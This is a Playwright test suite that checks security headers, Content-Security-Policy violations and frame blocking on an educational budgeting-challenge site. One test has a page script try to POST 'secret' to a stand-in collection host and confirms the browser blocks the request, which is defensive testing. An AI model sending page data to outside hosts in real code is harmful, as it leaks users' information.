import { type Page } from "@playwright/test";
import { expect, test } from "./fixtures";

const ROUTES = ["/", "/programme", "/challenge", "/parents", "/about"];

/** Records every Content-Security-Policy violation the browser reports. */
async function trackViolations(page: Page) {
  await page.addInitScript(() => {
    (window as unknown as { __csp: string[] }).__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => (window as unknown as { __csp: string[] }).__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
  return () => page.evaluate(() => (window as unknown as { __csp: string[] }).__csp);
}

test("security headers are present on every route", async ({ request }) => {
  for (const path of ROUTES) {
    const h = (await request.get(path)).headers();
    expect(h["content-security-policy"], path).toContain("default-src 'self'");
    expect(h["content-security-policy"]).toContain("object-src 'none'");
    expect(h["content-security-policy"]).toContain("frame-ancestors 'none'");
    expect(h["content-security-policy"]).toContain("connect-src 'self'");
    expect(h["x-frame-options"]).toBe("DENY");
    expect(h["x-content-type-options"]).toBe("nosniff");
    expect(h["referrer-policy"]).toBe("strict-origin-when-cross-origin");
    expect(h["permissions-policy"]).toContain("camera=()");
    expect(h["x-robots-tag"]).toContain("noindex");
    expect(h["x-powered-by"]).toBeUndefined();
  }
});

test("no CSP violations on any page or during a full challenge run", async ({ page }) => {
  const violations = await trackViolations(page);
  for (const path of ROUTES) {
    await page.goto(path);
    await page.waitForLoadState("networkidle");
    expect(await violations(), path).toEqual([]);
  }

  await page.goto("/challenge");
  const est = page.locator("form", { hasText: /Your estimate/ });
  await est.getByRole("textbox").fill("70000");
  await est.getByRole("textbox").press("Enter");
  await page.getByRole("button", { name: /Next: Calculate/ }).click();
  for (const [re, v] of [[/40 cups/, "48000"], [/60 samosas/, "24000"], [/total cost of both orders/, "72000"], [/how much money is left/, "13000"]] as const) {
    const f = page.locator("form", { hasText: re });
    await f.getByRole("textbox").fill(v);
    await f.getByRole("textbox").press("Enter");
  }
  await page.getByRole("button", { name: /Next: Choose/ }).click();
  await page.getByRole("textbox", { name: /^Fruit juice/ }).fill("30");
  await page.getByRole("textbox", { name: /^Samosa/ }).fill("40");
  expect(await violations()).toEqual([]);
});

test("the browser blocks page scripts from sending data to another origin", async ({ page }) => {
  const violations = await trackViolations(page);
  await page.goto("/challenge");
  const result = await page.evaluate(() => fetch("https://example.com/collect", { method: "POST", body: "secret" }).then(() => "allowed", () => "blocked"));
  expect(result).toBe("blocked");
  expect((await violations()).some((v) => v.startsWith("connect-src"))).toBe(true);
});

test("the site refuses to be embedded in a frame", async ({ page }) => {
  await page.goto("/");
  const framed = await page.evaluate(
    () =>
      new Promise<string>((resolve) => {
        const f = document.createElement("iframe");
        f.src = location.origin + "/about";
        f.onload = () => setTimeout(() => resolve(f.contentDocument?.body?.innerText ? "framed" : "blocked"), 300);
        document.body.appendChild(f);
      }),
  );
  expect(framed).toBe("blocked"); // X-Frame-Options and frame-ancestors deny embedding
});
